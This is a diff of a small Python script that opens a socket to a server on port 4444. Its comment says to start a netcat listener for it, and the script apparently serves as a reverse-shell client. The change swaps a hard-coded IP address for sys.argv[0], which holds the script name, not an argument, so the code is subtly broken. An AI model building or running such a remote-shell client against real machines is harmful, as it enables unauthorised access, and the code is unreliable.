@@ -1,5 +1,6 @@
 import socket
 import signal
+import sys
 import os
 import subprocess
 
@@ -7,7 +8,7 @@ s = socket.socket() # client computer can connect to others
 
 # ip address of server
 # spin up the server with `nc -l localhost 4444``
-host = "129.21.49.61"
+host = sys.argv[0]
 port = 4444
 
 # open a socket to the server
